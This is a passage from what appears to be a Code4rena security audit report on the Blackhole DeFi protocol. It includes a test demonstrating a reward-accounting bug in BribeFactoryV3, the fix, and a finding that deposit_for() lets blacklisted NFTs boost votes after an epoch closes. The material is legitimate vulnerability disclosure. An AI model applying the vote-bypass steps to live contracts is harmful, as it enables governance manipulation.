  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceipt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get the bribe address from the factory\u0026#39;s last_bribe variable\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elast_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractAt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Bribe\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add some tokens to the bribe contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;1000\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;recoverERC20AndUpdateData\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Should demonstrate bug in recoverERC20AndUpdateData\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get initial token rewards per epoch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetEpochStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenRewardsPerEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Call recoverERC20AndUpdateData through the factory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecoveryAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003erecoverERC20AndUpdateData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecoveryAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get final token rewards per epoch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenRewardsPerEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This fails because the factory uses emergencyRecoverERC20, which does not update rewards\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esub\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecoveryAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Token rewards per epoch should be updated but weren\u0026#39;t\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eTest Result\u003c/strong\u003e: The test fails with the following error, confirming the bug:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"55\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAssertionError: Expected \u0026quot;0\u0026quot; to be equal -100000000000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+ expected - actual\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e-  \u0026quot;_hex\u0026quot;: \u0026quot;-0x056bc75e2d63100000\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+  \u0026quot;_hex\u0026quot;: \u0026quot;0x00\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e   \u0026quot;_isBigNumber\u0026quot;: true\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eExplanation\u003c/strong\u003e:\u003c/p\u003e\n\u003cp\u003eThe test expects \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e to decrease by \u003ccode\u003e100 ether\u003c/code\u003e after calling \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e on \u003ccode\u003eBribeFactoryV3\u003c/code\u003e. However, because \u003ccode\u003eemergencyRecoverERC20\u003c/code\u003e is called instead, \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e remains unchanged (\u003ccode\u003e0\u003c/code\u003e), causing the test to fail.\u003c/p\u003e\n\u003cp\u003eThis demonstrates that the incorrect function call in \u003ccode\u003eBribeFactoryV3\u003c/code\u003e skips the critical update to \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e, leading to potential reward over-distribution.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-44\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-22\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-35\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/factories/BribeFactoryV3.sol#L199\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/factories/BribeFactoryV3.sol#L199\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-12-epoch-voting-restrictions-bypassed-via-deposit_for-for-blacklistednon-whitelisted-tokenids\" style=\"position:relative;\"\u003e\u003ca href=\"#m-12-epoch-voting-restrictions-bypassed-via-deposit_for-for-blacklistednon-whitelisted-tokenids\" aria-label=\"m 12 epoch voting restrictions bypassed via deposit_for for blacklistednon whitelisted tokenids permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-283\"\u003e[M-12] Epoch voting restrictions bypassed via \u003ccode\u003edeposit_for()\u003c/code\u003e for blacklisted/non-whitelisted \u003ccode\u003etokenID\u003c/code\u003es\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-166\"\u003erayss\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VoterV3.sol#L174\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VoterV3.sol#L174\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L816\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L816\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-2\" aria-label=\"finding description and impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe vote function in VoterV3.sol restricts voting after the epoch ends, allowing only whitelisted \u003ccode\u003etokenIds\u003c/code\u003e (NFTs) or those meeting specific conditions (i.e., \u003ccode\u003eIAutoVotingEscrowManager(avm).tokenIdToAVMId(_tokenId) == 0\u003c/code\u003e) to continue voting. However, this restriction can be bypassed because the \u003ccode\u003edeposit_for\u003c/code\u003e function, which internally calls poke—does not enforce these same checks. As a result, even holders of non-whitelisted or blacklisted \u003ccode\u003etokenIds\u003c/code\u003e can call \u003ccode\u003edeposit_for\u003c/code\u003e after the epoch has ended. While this does not allow them to vote for new pools, it does let them increase the weight of their existing votes (i.e., the pools they had previously voted for) if their NFT balance has increased. This effectively constitutes a form of post-epoch voting and undermines the intended voting restrictions.\u003c/p\u003e\n\u003cp\u003eSince poke recalculates voting power based on the current NFT balance (\u003ccode\u003euint256 _weight = IVotingEscrow(_ve).balanceOfNFT(_tokenId);\u003c/code\u003e), a user’s voting weight can increase if their NFT balance increases (which they can do by depositing). This allows them to effectively circumvent the protocol’s intended epoch-based voting restrictions and manipulate vote weights after the voting window closesons.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-8\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eEpoch ends: The protocol’s voting period finishes, and the vote function stops accepting new votes from non-whitelisted \u003ccode\u003etokenIds\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eUser with non-whitelisted NFT: Alice holds an NFT that is not whitelisted (i.e., blacklisted) and thus can’t vote through the vote function anymore.\u003c/li\u003e\n\u003cli\u003eAlice calls \u003ccode\u003edeposit_for()\u003c/code\u003e: Although the epoch has ended and she cannot vote for new pools, Alice calls the \u003ccode\u003edeposit_for\u003c/code\u003e function with her NFT’s tokenId and passes an amount. This function internally triggers poke, which updates her vote weights.\u003c/li\u003e\n\u003cli\u003eBoosting vote weights: This allows Alice to increase the weight of her existing votes (to previously selected pools). Additionally, Alice could strategically vote with minimal weights to multiple pools during the active epoch, and then after the epoch ends, call \u003ccode\u003edeposit_for()\u003c/code\u003e to amplify those votes using her updated (larger) NFT balance—bypassing intended vote limitations (e.g, The epoch ends).\u003c/li\u003e\n\u003cli\u003eVotes updated: The protocol accepts the recalculated vote weights, allowing Alice to affect governance decisions even after the official voting period has ended.\u003c/li\u003e\n\u003cli\u003ePoking should be only allowed when epoch is active.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"impact-9\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUsers with non-whitelisted or blacklisted NFTs can bypass epoch restrictions by using the poke function after the epoch period ends.\u003c/li\u003e\n\u003cli\u003eUnauthorized vote recasting allows these users to increase their voting power outside the designated voting window.\u003c/li\u003e\n\u003cli\u003eMalicious actors could unfairly influence governance proposals beyond intended timeframes.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"severity-justification-1\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-justification-1\" aria-label=\"severity justification 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 